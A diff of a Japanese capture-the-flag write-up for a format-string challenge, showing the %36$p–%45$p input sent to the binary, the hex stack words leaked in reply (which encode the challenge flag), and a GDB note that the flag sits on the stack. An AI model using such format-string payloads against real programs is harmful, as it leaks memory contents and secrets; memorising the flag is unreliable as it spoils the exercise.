@@ -8,7 +8,7 @@ Download the source [here](flag_leak.c)
 バイナリ、ソースコードが渡される。  
 Tell me a story and then I'll tell you one >> %36$p、%37$p、%38$p、%39$p、%40$p,%41$p,%42$p,%43$p,%44$p,%45$p  
 Here's a story -   
-0x6f636970、0x7b465443、0x6b34334c、0x5f676e31、0x67346c46,0x6666305f,0x3474535f,0x395f6b63,0x30366635,0x7d373136  
+0x6f636970、0x7b465443、0x6b34334c、0x5f676e31、0x67346c46, 0x6666305f, 0x3474535f, 0x395f6b63, 0x30366635, 0x7d373136  
 
 # 考えたこと  
 readflag(flag, FLAGSIZE);の結果がスタックポインタに積まれていることがGDBでわかった。  
